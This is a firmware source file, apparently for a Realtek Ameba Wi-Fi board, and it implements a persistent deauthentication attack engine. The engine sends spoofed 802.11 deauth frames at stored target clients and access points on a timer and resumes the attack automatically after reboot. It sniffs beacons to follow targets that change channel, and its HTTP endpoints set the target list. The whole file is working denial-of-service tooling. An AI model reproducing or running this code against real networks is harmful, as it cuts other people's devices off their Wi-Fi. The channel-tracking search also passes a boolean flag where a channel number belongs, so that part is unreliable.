#include <Arduino.h>
#include <WiFi.h>
#include <main.h>
#include <wifi_conf.h>
#include <wifi_structures.h>
#include <ArduinoJson.h>
#include "api_all.h"
#include "attacker.h"
#include "wifi_cust_tx.h"
#include "utils.h"
#include "ap_powersave.h"
#include "settings.h"
#include "wifi_drv.h"

#include "FreeRTOS.h"
#include "timers.h"

#ifdef __cplusplus
extern "C" {
#include "ameba_soc.h"
}
#endif

#define ATTACK_BOOT_HOLD_SEC 30  // 开机延迟 30 秒执行攻击（出bug时不至于拖 SoftAP 下水）
#define ATTACK_ROUND_PACKETS 4      // 每个目标每轮发包数（与 test-deauth 一致）
// === 目标 AP 信道跟踪配置 ===
#define CH_TRACK_INTERVAL_SEC     60   // 两次核查最小时间间隔(s)
#define CH_TRACK_LISTEN_MS        500   // 核查阶段：在当前信道监听 Beacon 的驻留时间（ms）
#define CH_TRACK_SCAN_DWELL_MS    250   // 搜寻阶段：每个候选信道的驻留时间（ms）

// 引擎状态（统计与运行标志不落盘）
static volatile bool g_attack_running = false;
static uint32_t g_next_fire_ms = 0;
static uint8_t g_start_channel = 1;  // 攻击启动时信道，停止时恢复
static uint32_t g_attack_rounds = 0;
static uint32_t g_attack_packets = 0;
static bool s_boot_resume_pending = false;

// === 信道跟踪状态 ===
static uint32_t g_last_track_ms = 0;            // 上次核查时间戳（millis）
// 搜寻优先信道列表：常用信道优先（1/6/11），然后其余 2.4GHz 信道
static const uint8_t CH_TRACK_PRIORITY[] = { 1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13 };
static const int CH_TRACK_PRIORITY_COUNT = sizeof(CH_TRACK_PRIORITY) / sizeof(CH_TRACK_PRIORITY[0]);
static void runChannelTrack();


static bool isChannelValid(int ch) {
    if (ch >= 1 && ch <= 14) return true;
    switch (ch) {
        case 36: case 40: case 44: case 48:
        case 52: case 56: case 60: case 64:
        case 100: case 104: case 108: case 112:
        case 116: case 120: case 124: case 128:
        case 132: case 136: case 140: case 144:
        case 149: case 153: case 157: case 161:
        case 165: return true;
        default: return false;
    }
}

// 切换收发信道（与 api_scan/test-deauth 相同的切信道流程）
// AP 挂起期间只切 WLAN0（STA 侧）信道，跳过 wifi_ap_switch_chl_and_inform
static bool switchChannel(int ch) {
    if (ch == ap_channel) return true;
    if (!apPowerSaveIsSuspended()) {
        if (wifi_ap_switch_chl_and_inform(ch) != RTW_SUCCESS) {
            Serial.print("[ATTACK] wifi_ap_switch_chl_and_inform failed, ch=");
            Serial.println(ch);
            return false;
        }
    }
    wext_set_channel(WLAN0_NAME, ch);  // 必须，上面的调用不够
    ap_channel = ch;
    delay(100);
    return true;
}

// 最小唤醒：仅拉起 RF 到能发 raw 帧的程度，不恢复 beacon、不重建安全上下文，
// 不经过 rltk_resume_softap / remountSoftAPBeacon，省电状态机保持"挂起"不变
static void minimalRadioWake() {
    if (!apPowerSaveIsSuspended()) return;
    if (wifi_disable_powersave() != RTW_SUCCESS) {
        Serial.println("[ATTACK] minimal wake: wifi_disable_powersave failed");
    }
    delay(5);
}

static void minimalRadioSleep() {
    if (apPowerSaveIsSuspended()) {
        wifi_enable_powersave();  // RF 重新关闭，继续挂起省电
    }
}

static void sendBurstForChannel(uint8_t ch) {
    for (int i = 0; i < g_appSettings.attack_target_count; i++) {
        AttackTargetRecord& t = g_appSettings.attack_targets[i];
        if (t.channel != ch) continue;
        for (int p = 0; p < ATTACK_ROUND_PACKETS; p++) {
            // 伪造客户端单方向往 AP 发 deauth（DoS），与 test-deauth 相同帧方向
            wifi_tx_deauth_frame_ext(t.mac, t.bssid, t.bssid, 0x03);
            g_attack_packets++;
        }
    }
}

// 执行一轮攻击：按信道分组切换信道发包，结束后恢复启动时信道
static void runAttackRound() {
    bool was_suspended = apPowerSaveIsSuspended();
    if (was_suspended) minimalRadioWake();

    // 收集目标信道（去重）
    uint8_t channels[MAX_ATTACK_TARGETS];
    int channel_count = 0;
    for (int i = 0; i < g_appSettings.attack_target_count; i++) {
        uint8_t ch = g_appSettings.attack_targets[i].channel;
        bool dup = false;
        for (int j = 0; j < channel_count; j++) {
            if (channels[j] == ch) { dup = true; break; }
        }
        if (!dup) channels[channel_count++] = ch;
    }

    for (int c = 0; c < channel_count; c++) {
        if (switchChannel(channels[c])) {
            sendBurstForChannel(channels[c]);
        }
    }
    Serial.println("[ATTACK] deauth sent");
    switchChannel(g_start_channel);

    // 检查目标AP是否切换了信道，在射频即将关闭之前执行。AP休眠启用时，不要影响AP本来就不长的唤醒时间
    if (g_appSettings.ap_powersave_enable == 0 || was_suspended) {
        auto now = millis();
        if (now - g_last_track_ms >= CH_TRACK_INTERVAL_SEC * 1000) {
            g_last_track_ms = now;
            runChannelTrack();
        }
    }
    if (was_suspended) minimalRadioSleep();

    g_attack_rounds++;
    g_next_fire_ms = millis() + g_appSettings.attack_interval_ms;
}

// 检查目标是否全部处于同一信道，若是则返回该信道号，否则返回 0
static uint8_t getSingleTargetChannel() {
    if (g_appSettings.attack_target_count == 0) return 0;
    uint8_t ch = g_appSettings.attack_targets[0].channel;
    for (int i = 1; i < g_appSettings.attack_target_count; i++) {
        if (g_appSettings.attack_targets[i].channel != ch) {
            return 0;
        }
    }
    return ch;
}

static void startAttackEngine() {
    // 第一次开始时，若所有目标在同一信道，直接将 SoftAP 切换到该信道，避免每轮攻击来回切信道
    uint8_t single_ch = getSingleTargetChannel();
    if (single_ch != 0) {
        Serial.print("[ATTACK] All targets on channel ");
        Serial.print(single_ch);
        Serial.println(", switching SoftAP channel upfront");
        switchChannel(single_ch);
    }

    g_attack_running = true;
    g_start_channel = ap_channel;
    g_attack_rounds = 0;
    g_attack_packets = 0;
    g_next_fire_ms = millis();  // 首轮立即执行
    g_last_track_ms = g_next_fire_ms;  // 从启动时刻开始计时
}

void attackerInit() {
    g_attack_running = false;
    s_boot_resume_pending = false;

    // 重启后如果攻击计划处于开启状态，推迟 30 秒执行（给 SoftAP 连接预留安全窗口）
    // 已踩坑：不要使用 FreeRTOS 软件定时器回调执行 startAttackEngine，
    // 因为信道切换内部的 wifi_ap_switch_chl_and_inform 会调用 rtw_down_sema 等待自身定时器，
    // 在 Timer Task 上下文中执行会导致自死锁（Self-Deadlock）。
    if (g_appSettings.attack_enabled == 1 && g_appSettings.attack_target_count > 0) {
        s_boot_resume_pending = true;
        Serial.print("[ATTACK] attack auto-resume postponed by ");
        Serial.print(ATTACK_BOOT_HOLD_SEC);
        Serial.println("s (grace period for AP connection)");
    }
}

void attackerTick() {
    if (s_boot_resume_pending) {  // 开机保护期倒计时
        if (millis() >= (uint32_t)ATTACK_BOOT_HOLD_SEC * 1000) {
            s_boot_resume_pending = false;
            startAttackEngine();
            Serial.println("[ATTACK] Boot grace period expired -> attack auto-resumed!");
        }
        return;
    }

    if (!g_attack_running || g_appSettings.attack_target_count == 0) return;

    uint32_t now = millis();

    if (now < g_next_fire_ms) {
        return;
    }

    runAttackRound();
}

// 距离下次开火毫秒数；未启用/无目标返回 UINT32_MAX；已到点返回 0
uint32_t attackerMsUntilNextFire() {
    if (s_boot_resume_pending) {
        uint32_t hold_ms = (uint32_t)ATTACK_BOOT_HOLD_SEC * 1000;
        uint32_t now = millis();
        return (now >= hold_ms) ? 0 : (hold_ms - now);
    }
    if (!g_attack_running || g_appSettings.attack_target_count == 0) return UINT32_MAX;
    uint32_t remain = g_next_fire_ms - millis();
    if (remain > 0x80000000UL) return 0;  // 时间已到（含溢出保护）
    return remain;
}

bool attackerIsRunning() {
    return g_attack_running;
}

void handleAttackStatusApi(HttpClient& client) {
    JsonDocument doc;
    doc["success"] = true;
    doc["enabled"] = g_attack_running;
    doc["type"] = (g_appSettings.attack_type == ATTACK_TYPE_DEAUTH) ? "deauth" : "unknown";
    doc["interval_sec"] = g_appSettings.attack_interval_ms / 1000.0;
    doc["ap_powersave_enabled"] = (g_appSettings.ap_powersave_enable == 1);
    doc["ap_saver_state"] = apPowerSaveStateName();
    doc["ap_channel"] = ap_channel;
    doc["rounds"] = g_attack_rounds;
    doc["packets"] = g_attack_packets;
    if (g_attack_running) {
        uint32_t remain = g_next_fire_ms - millis();
        doc["next_fire_ms"] = (remain > 0x80000000UL) ? 0 : remain;
    } else {
        doc["next_fire_ms"] = 0;
    }

    JsonArray targets = doc["targets"].to<JsonArray>();
    for (int i = 0; i < g_appSettings.attack_target_count; i++) {
        AttackTargetRecord& t = g_appSettings.attack_targets[i];
        JsonObject o = targets.add<JsonObject>();
        o["mac"] = formatMac(t.mac);
        o["bssid"] = formatMac(t.bssid);
        o["ssid"] = t.ssid;
        o["channel"] = t.channel;
        o["rssi"] = t.rssi;
    }
    client.sendJson(doc);
}

void handleAttackPlanApi(HttpClient& client) {
    if (client.method() != "POST") {
        client.sendJsonFail("Only POST method is allowed");
        return;
    }

    JsonDocument req;
    DeserializationError error = deserializeJson(req, client.body());
    if (error) {
        client.sendJsonFail("Invalid JSON body");
        return;
    }

    if (!req.containsKey("enabled")) {
        client.sendJsonFail("Missing enabled parameter");
        return;
    }
    bool enable = req["enabled"].as<bool>();

    JsonArray tarr = req["targets"].as<JsonArray>();
    if (tarr.isNull()) {
        client.sendJsonFail("Missing targets");
        return;
    }
    if (tarr.size() > MAX_ATTACK_TARGETS) {
        client.sendJsonFail("Too many targets (max 16)");
        return;
    }

    int type = req["type"] | (int)ATTACK_TYPE_DEAUTH;
    if (type < 0 || type >= ATTACK_TYPE_COUNT) {
        client.sendJsonFail("Unknown attack type");
        return;
    }

    double interval_sec = req["interval_sec"] | 5.0;
    if (interval_sec < 0.1 || interval_sec > 3600.0) {
        client.sendJsonFail("interval_sec must be between 0.1 and 3600");
        return;
    }
    uint32_t interval_ms = (uint32_t)(interval_sec * 1000.0 + 0.5);

    // 校验并解析目标列表
    AttackTargetRecord parsed[MAX_ATTACK_TARGETS];
    int count = 0;
    for (JsonObject t : tarr) {
        const char* macStr = t["mac"] | "";
        const char* bssidStr = t["bssid"] | "";
        uint8_t mac[6], bssid[6];
        if (strlen(macStr) == 0 || strlen(bssidStr) == 0 ||
            !parseMac(macStr, mac) || !parseMac(bssidStr, bssid)) {
            client.sendJsonFail("Invalid mac or bssid");
            return;
        }
        int ch = t["channel"] | 0;
        if (!isChannelValid(ch)) {
            client.sendJsonFail("Invalid channel");
            return;
        }
        for (int i = 0; i < count; i++) {
            if (memcmp(parsed[i].mac, mac, 6) == 0 && memcmp(parsed[i].bssid, bssid, 6) == 0) {
                client.sendJsonFail("Duplicate target");
                return;
            }
        }
        AttackTargetRecord& rec = parsed[count];
        memset(&rec, 0, sizeof(rec));
        memcpy(rec.mac, mac, 6);
        memcpy(rec.bssid, bssid, 6);
        rec.channel = (uint8_t)ch;
        const char* ssid = t["ssid"] | "";
        strncpy(rec.ssid, ssid, 32);
        rec.ssid[32] = '\0';
        rec.rssi = (int8_t)(t["rssi"] | 0);
        count++;
    }

    if (enable && count == 0) {
        client.sendJsonFail("No targets in plan");
        return;
    }

    // 一次性写入闪存（开始/停止时，避免频繁擦写）
    g_appSettings.attack_enabled = enable ? 1 : 0;
    g_appSettings.attack_type = (uint8_t)type;
    g_appSettings.attack_interval_ms = interval_ms;
    g_appSettings.attack_target_count = (uint8_t)count;
    for (int i = 0; i < count; i++) {
        g_appSettings.attack_targets[i] = parsed[i];
    }

    if (!saveSettings()) {
        client.sendJsonFail("Failed to write settings to FlashMemory");
        return;
    }

    // 取消可能正在等待的开机保护
    if (s_boot_resume_pending) {
        s_boot_resume_pending = false;
        Serial.println("[ATTACK] Boot delay timer canceled by API");
    }

    // 同步引擎
    if (enable) {
        startAttackEngine();
        Serial.print("[ATTACK] plan started, targets=");
        Serial.print(count);
        Serial.print(" interval=");
        Serial.println(g_appSettings.attack_interval_ms / 1000.0f);
    } else {
        g_attack_running = false;
        switchChannel(g_start_channel);  // 恢复攻击启动前信道
        Serial.println("[ATTACK] plan stopped");
    }

    JsonDocument resp;
    resp["success"] = true;
    resp["enabled"] = g_attack_running;
    resp["message"] = enable ? "Attack plan saved and started" : "Attack plan saved and stopped";
    client.sendJson(resp);
}



// ══════════════════════════════════════════════════════════════════════
//  信道跟踪（Channel Tracking）
//  目的：检测目标 AP 是否切换了信道，自动跟踪到新信道继续攻击
//
//  2. 在当前目标信道上短暂监听 Beacon（CH_TRACK_LISTEN_MS）
//  3. 如果收到目标 AP 的 Beacon → 一切正常，继续攻击
//  4. 如果未收到 → 按优先顺序扫描常用信道（1/6/11 优先）搜寻目标
//  5. 如果在新信道找到 → 更新所有匹配目标的 channel 字段，不写flash只临时存内存
//  6. 如果搜索完毕仍未找到 → 暂不处理，等待下次核查
// ══════════════════════════════════════════════════════════════════════

// 从 802.11 Beacon 帧中解析 AP 声明的当前工作信道
// 优先解析 DS Parameter Set (Tag 3)，其次解析 HT Operation (Tag 61)
static uint8_t parseBeaconChannel(const unsigned char* buf, unsigned int len) {
    if (!buf || len < 36 + 2) return 0;

    int offset = 36;
    while (offset + 2 <= (int)len) {
        uint8_t ie_id = buf[offset];
        uint8_t ie_len = buf[offset + 1];
        if (offset + 2 + ie_len > (int)len) break;

        // DS Parameter Set (Tag 3): 包含 1 字节当前工作信道 (1..14)
        if (ie_id == 3 && ie_len >= 1) {
            uint8_t ch = buf[offset + 2];
            if (isChannelValid(ch)) return ch;
        }
        // HT Operation (Tag 61): 偏移 0 为 Primary Channel
        if (ie_id == 61 && ie_len >= 1) {
            uint8_t ch = buf[offset + 2];
            if (isChannelValid(ch)) return ch;
        }

        offset += 2 + ie_len;
    }
    return 0;
}

// 混杂模式回调使用的共享状态
static volatile bool g_track_beacon_found = false;    // 是否在监听期间收到目标 Beacon
static uint8_t g_track_target_bssid[6];               // 当前搜寻的目标 BSSID
static volatile uint8_t g_track_listening_channel = 0;// 当前正在监听的信道
static volatile uint8_t g_track_found_channel = 0;    // 收到目标 Beacon 时解析出的实际工作信道

static void channelTrackCallback(unsigned char* buf, unsigned int len, void* userdata) {
    (void)userdata;
    if (!buf || len < 24 + 8) return;

    uint16_t fc = buf[0] | (buf[1] << 8);
    uint8_t type = (fc >> 2) & 0x03;
    uint8_t subtype = (fc >> 4) & 0x0F;

    // 只关注 Beacon（Management type=0, subtype=8）
    if (type != 0 || subtype != 8) return;

    const uint8_t* sa = buf + 10;
    const uint8_t* bssid = buf + 16;

    // 匹配目标 BSSID（Address 3 为正式 BSSID，Address 2 为源 AP MAC）
    if (memcmp(bssid, g_track_target_bssid, 6) != 0 &&
        memcmp(sa, g_track_target_bssid, 6) != 0) {
        return;
    }

    uint8_t bcn_channel = parseBeaconChannel(buf, len);
    if (bcn_channel != 0) {
        // 2.4GHz 邻信道（如 CH1 与 CH2/3）频谱重叠，可能会收到相邻信道帧，当前信道不一定是AP声明的信道
        // 记录 Beacon 帧内声明的真实信道
        g_track_found_channel = bcn_channel;
    } else {
        // 未解析到信道 IE 的兜底情况：认可当前监听信道
        g_track_found_channel = g_track_listening_channel;
    }
    g_track_beacon_found = true;
}

// 在指定信道上监听 dwell_ms 毫秒，检测是否能收到目标 BSSID 的 Beacon
// 返回 true 表示在当前信道上确认收到了目标的 Beacon
static bool listenForBeacon(const uint8_t* target_bssid, uint8_t channel, uint32_t dwell_ms) {
    memcpy(g_track_target_bssid, target_bssid, 6);
    g_track_listening_channel = channel;
    g_track_beacon_found = false;
    g_track_found_channel = 0;

    wext_set_channel(WLAN0_NAME, channel);
    wifi_set_promisc(RTW_PROMISC_ENABLE_2, channelTrackCallback, 1);

    for (uint32_t ms = 0; ms < dwell_ms; ms += 10) {
        delay(10);
        if (g_track_beacon_found) break;  // 提前退出：已收到目标 Beacon
    }

    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
    return g_track_beacon_found;
}

// 对所有目标中匹配指定 BSSID 的记录，将信道临时更新为 new_channel
static int updateTargetChannel(const uint8_t* bssid, uint8_t new_channel) {
    int updated = 0;
    for (int i = 0; i < g_appSettings.attack_target_count; i++) {
        if (memcmp(g_appSettings.attack_targets[i].bssid, bssid, 6) == 0) {
            g_appSettings.attack_targets[i].channel = new_channel;
            updated++;
        }
    }
    if (updated > 0) {
        Serial.print("[ATTACK] Channel tracking: updated ");
        Serial.print(updated);
        Serial.print(" target(s) to channel ");
        Serial.println(new_channel);
    }
    return updated;
}

// 执行一次信道核查：检测目标 AP 是否仍在原信道，若已漫游则搜寻并跟踪
// 仅在所有目标共享同一 BSSID 时才有意义（多 BSSID 场景暂不处理）
// 本函数只在射频开启时运行，不会手动打开或者关闭
static void runChannelTrack() {
    if (g_appSettings.attack_target_count == 0) return;

    // 收集所有不重复的 BSSID（多数场景只有一个目标 AP）
    uint8_t bssids[MAX_ATTACK_TARGETS][6];
    uint8_t bssid_channels[MAX_ATTACK_TARGETS];
    int bssid_count = 0;
    for (int i = 0; i < g_appSettings.attack_target_count; i++) {
        bool dup = false;
        for (int j = 0; j < bssid_count; j++) {
            if (memcmp(bssids[j], g_appSettings.attack_targets[i].bssid, 6) == 0) {
                dup = true;
                break;
            }
        }
        if (!dup) {
            memcpy(bssids[bssid_count], g_appSettings.attack_targets[i].bssid, 6);
            bssid_channels[bssid_count] = g_appSettings.attack_targets[i].channel;
            bssid_count++;
        }
    }

    for (int b = 0; b < bssid_count; b++) {
        uint8_t orig_ch = bssid_channels[b];

        Serial.print("[ATTACK] Channel check: BSSID=");
        Serial.print(formatMac(bssids[b]));
        Serial.print(" on CH");
        Serial.println(orig_ch);

        // 第一步：在当前目标信道上监听 Beacon
        if (listenForBeacon(bssids[b], orig_ch, CH_TRACK_LISTEN_MS)) {
            if (g_track_found_channel != 0 && g_track_found_channel != orig_ch) {
                Serial.print("[ATTACK] Channel check: leakage beacon detected, switching hinted CH");
                Serial.println(g_track_found_channel);
                updateTargetChannel(bssids[b], g_track_found_channel);
            } else {
                // AP 仍在原信道，继续检查下一个 BSSID
                Serial.println("[ATTACK] Channel check: beacon OK, AP still on channel");
            }
            continue;
        }

        // 第二步：未收到 Beacon，按优先信道列表搜寻
        Serial.println("[ATTACK] Channel check: no beacon! Scanning for AP...");
        bool found = false;
        for (int c = 0; c < CH_TRACK_PRIORITY_COUNT; c++) {
            uint8_t scan_ch = CH_TRACK_PRIORITY[c];
            if (scan_ch == orig_ch) continue;  // 已经在原信道试过了，跳过

            if (listenForBeacon(bssids[b], scan_ch, CH_TRACK_SCAN_DWELL_MS)) {
                Serial.print("[ATTACK] Channel tracking: AP found on CH");
                Serial.println(g_track_beacon_found);
                updateTargetChannel(bssids[b], g_track_beacon_found);
                found = true;
                break;
            }
        }

        if (!found) {
            Serial.println("[ATTACK] Channel tracking: AP not found on any channel, skipping");
        }
    }

    // 恢复到攻击使用的信道（可能已被更新）
    uint8_t single_ch = getSingleTargetChannel();
    if (single_ch != 0 && single_ch != ap_channel) {
        switchChannel(single_ch);
        g_start_channel = single_ch;
    } else {
        switchChannel(g_start_channel);
        wext_set_channel(WLAN0_NAME, g_start_channel);
    }
}